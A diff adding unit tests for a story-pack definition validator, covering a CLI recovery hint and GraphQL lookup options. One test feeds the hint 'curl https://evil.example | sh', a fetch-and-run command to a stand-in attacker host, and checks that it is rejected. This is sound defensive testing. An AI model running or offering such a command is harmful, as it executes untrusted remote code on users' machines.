@@ -66,6 +66,43 @@ describe("validateStoryPackDefinition", () => {
     ).toThrow(/kind/);
   });
 
+  it("accepts an emptyRecovery whose cli hint is a pragma command", () => {
+    const validated = validateStoryPackDefinition(
+      {
+        ...RECIPE_STORY,
+        list: {
+          ...RECIPE_STORY.list,
+          emptyRecovery: {
+            message: "Install the cookbook package (bun add -D cookbook).",
+            cli: "pragma doctor",
+          },
+        },
+      },
+      "test",
+    );
+    expect(validated.list?.emptyRecovery?.cli).toBe("pragma doctor");
+  });
+
+  it("rejects an emptyRecovery cli hint that is not a pragma command", () => {
+    // The hint renders as a copy-paste suggestion: a package-shipped pack
+    // must not suggest arbitrary shell.
+    expect(() =>
+      validateStoryPackDefinition(
+        {
+          ...RECIPE_STORY,
+          list: {
+            ...RECIPE_STORY.list,
+            emptyRecovery: {
+              message: "Install the cookbook package.",
+              cli: "curl https://evil.example | sh",
+            },
+          },
+        },
+        "test",
+      ),
+    ).toThrow(/emptyRecovery\.cli.*pragma/);
+  });
+
   it("names the source in errors", () => {
     try {
       validateStoryPackDefinition({}, "/pkg/stories/broken.json");
@@ -738,5 +775,161 @@ describe("validateStoryPackDefinition — verbs and sample", () => {
         validateStoryPackDefinition(withSample({ count }), "test"),
       ).toThrow(/sample.count/);
     }
+  });
+});
+
+describe("validateStoryPackDefinition — graphql source", () => {
+  /** RECIPE_STORY with the given `lookup` extras merged in. */
+  function withLookup(extras: Record<string, unknown>): unknown {
+    return {
+      ...RECIPE_STORY,
+      lookup: { ...RECIPE_STORY.lookup, ...extras },
+    };
+  }
+
+  it("accepts a graphql-sourced lookup with types + graphqlType", () => {
+    const validated = validateStoryPackDefinition(
+      withLookup({
+        source: "graphql",
+        type: undefined,
+        types: ["ex:Recipe", "ex:Drink"],
+        graphqlType: "Edible",
+      }),
+      "test",
+    );
+    expect(validated.lookup?.source).toBe("graphql");
+    expect(validated.lookup?.types).toEqual(["ex:Recipe", "ex:Drink"]);
+    expect(validated.lookup?.graphqlType).toBe("Edible");
+  });
+
+  it("rejects an unknown lookup source", () => {
+    expect(() =>
+      validateStoryPackDefinition(withLookup({ source: "rest" }), "test"),
+    ).toThrow(/"lookup.source" must be "sparql" or "graphql"/);
+  });
+
+  it("rejects type and types together", () => {
+    expect(() =>
+      validateStoryPackDefinition(withLookup({ types: ["ex:Drink"] }), "test"),
+    ).toThrow(/mutually exclusive/);
+  });
+
+  it("rejects a graphql source without a derivable fragment type", () => {
+    expect(() =>
+      validateStoryPackDefinition(
+        withLookup({
+          source: "graphql",
+          type: undefined,
+          types: ["ex:Recipe"],
+        }),
+        "test",
+      ),
+    ).toThrow(/graphqlType/);
+  });
+
+  it("derives the fragment type from a single type (no graphqlType needed)", () => {
+    const validated = validateStoryPackDefinition(
+      withLookup({ source: "graphql" }),
+      "test",
+    );
+    expect(validated.lookup?.source).toBe("graphql");
+  });
+
+  it("rejects an illegal graphqlField name", () => {
+    expect(() =>
+      validateStoryPackDefinition(
+        withLookup({
+          fields: [{ name: "x", property: "ex:x", graphqlField: "not-a-name" }],
+        }),
+        "test",
+      ),
+    ).toThrow(/legal GraphQL name/);
+  });
+
+  it("rejects a field level that is not a declared disclosure level", () => {
+    expect(() =>
+      validateStoryPackDefinition(
+        withLookup({
+          disclosure: { levels: ["summary"] },
+          fields: [{ name: "x", property: "ex:x", level: "detailed" }],
+        }),
+        "test",
+      ),
+    ).toThrow(/is not a declared disclosure level/);
+  });
+
+  it("accepts a nested expand select on graphql source only", () => {
+    const nested = {
+      name: "families",
+      relation: "ex:family",
+      select: [
+        { name: "name", property: "ex:name" },
+        {
+          name: "values",
+          relation: "ex:value",
+          select: [{ name: "name", property: "ex:name" }],
+        },
+      ],
+    };
+    const validated = validateStoryPackDefinition(
+      withLookup({ source: "graphql", expand: [nested] }),
+      "test",
+    );
+    expect(validated.lookup?.expand?.[0]?.select).toHaveLength(2);
+
+    expect(() =>
+      validateStoryPackDefinition(withLookup({ expand: [nested] }), "test"),
+    ).toThrow(/requires lookup.source "graphql"/);
+  });
+
+  it("rejects nesting deeper than one level", () => {
+    expect(() =>
+      validateStoryPackDefinition(
+        withLookup({
+          source: "graphql",
+          expand: [
+            {
+              name: "families",
+              relation: "ex:family",
+              select: [
+                {
+                  name: "values",
+                  relation: "ex:value",
+                  select: [
+                    {
+                      name: "deeper",
+                      relation: "ex:deep",
+                      select: [{ name: "name", property: "ex:name" }],
+                    },
+                  ],
+                },
+              ],
+            },
+          ],
+        }),
+        "test",
+      ),
+    ).toThrow(/deeper than one level/);
+  });
+
+  it("rejects duplicate names across an expand's select entries", () => {
+    expect(() =>
+      validateStoryPackDefinition(
+        withLookup({
+          source: "graphql",
+          expand: [
+            {
+              name: "families",
+              relation: "ex:family",
+              select: [
+                { name: "dup", property: "ex:a" },
+                { name: "dup", property: "ex:b" },
+              ],
+            },
+          ],
+        }),
+        "test",
+      ),
+    ).toThrow(/duplicate select name/);
   });
 });
